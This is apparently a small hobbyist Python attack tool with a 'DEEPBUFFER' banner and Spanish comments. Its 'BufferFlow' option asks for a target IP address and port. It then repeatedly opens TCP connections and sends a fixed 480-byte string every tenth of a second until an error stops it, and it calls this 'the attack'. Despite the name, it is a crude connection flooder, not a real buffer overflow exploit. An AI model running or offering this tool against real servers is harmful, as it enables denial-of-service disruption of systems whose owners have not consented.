import socket
import os
import platform
import time

# Limpiar pantalla según el sistema operativo
if platform.system() == "Windows":
    os.system('cls')  # Windows
else:
    os.system('clear')  # Linux/macOS

# Mostrar el banner
print("\033[0;34m")
print("""
 ________  _______   _______   ________  ________  ___  ___  ________ ________ _______   ________     
|\   ___ \|\  ___ \ |\  ___ \ |\   __  \|\   __  \|\  \|\  \|\  _____\\  _____\\  ___ \ |\   __  \    
\ \  \_|\ \ \   __/|\ \   __/|\ \  \|\  \ \  \|\ /\ \  \\\  \ \  \__/\ \  \__/\ \   __/|\ \  \|\  \   
 \ \  \ \\ \ \  \_|/_\ \  \_|/_\ \   ____\ \   __  \ \  \\\  \ \   __\\ \   __\\ \  \_|/_\ \   _  _\  
  \ \  \_\\ \ \  \_|\ \ \  \_|\ \ \  \___|\ \  \|\  \ \  \\\  \ \  \_| \ \  \_| \ \  \_|\ \ \  \\  \| 
   \ \_______\ \_______\ \_______\ \__\    \ \_______\ \_______\ \__\   \ \__\   \ \_______\ \__\\ _\ 
    \|_______|\|_______|\|_______|\|__|     \|_______|\|_______|\|__|    \|__|    \|_______|\|__|\|__|
""")
print("\033[0m")
print("\033[32m")
print("1-BufferFlow")
print("2-Credits")

user = int(input("Which option> "))



if user == 1:
    ip = input("Please input the IP address: ")
    port = int(input("Please inpwut the port: "))

    try:
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                message = "KN" * 240  # Mensaje grande
                sock.sendall(message.encode())  # Mejor usar sendall
                print(f"Message sent to {ip}:{port}")
                sock.close()
                time.sleep(0.1)  # Pequeña pausa para no saturar tu máquina
            except Exception as e:
                print(f"There was an error in the attack or on the server: {e}")
                break
    except Exception as e:
        print(f"Could not connect: {e}")

elif user == 2:
    print("Credits: Know56")
else:
    print("Invalid option selected.")
